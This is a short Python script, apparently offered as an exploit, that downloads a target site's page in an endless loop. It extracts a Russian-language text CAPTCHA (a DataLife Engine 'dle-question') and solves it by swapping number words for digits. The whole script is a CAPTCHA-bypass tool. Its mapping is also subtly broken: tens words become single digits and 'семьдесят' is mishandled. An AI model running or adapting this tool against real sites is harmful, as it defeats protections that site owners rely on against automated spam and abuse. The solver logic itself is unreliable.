# coding: utf-8
from requests import get;
from sys import argv, exit;
from time import sleep;

class Exploit(object):       

    def Get():
        #Get html and return captcha
        global line
        with open('html.dat', 'w') as file:
            file.write(get(URI).text);
        file = open('html.dat','r');
        for line in file:
            if "Введите цифрами " in line:
                return line;

    def Captcha():
        #Solving captcha
        char_x =    {
                      ' двадцать':2,
                      ' тридцать':3,
                      ' сорок':4,
                      ' пятьдесят':5,
                      ' шестьдесят':6,
                      ' восемьдесят':8,
                      ' девяносто':9,
                      ' ноль':0,
                      ' один':1,
                      ' два':2,
                      ' три':3,
                      ' четыре':4,
                      ' пять':5,
                      ' шесть':6,
                      ' семь':7,
                      ' восемь':8,
                      ' девять':9
                    }

        text = line.split('<span id="dle-question">Введите цифрами')[1].split('</span>')[0]
        print('[+] Captcha:%s' % text)

        for key in char_x.keys():
            text = text.replace(key, str(char_x[key]))

        print('[+] Solved captcha: %s' % text);
        return text;

    def ArgParser():
        try:
            global URI
            URI = argv[1]
        except IndexError:
            print('\n\tUsage:python %s [target_url]' % argv[0])
            exit(0)

def main():

    Exploit.ArgParser()
    while 1:
        Exploit.Get()
        Exploit.Captcha()
        sleep(3)

if __name__ == '__main__':
    main();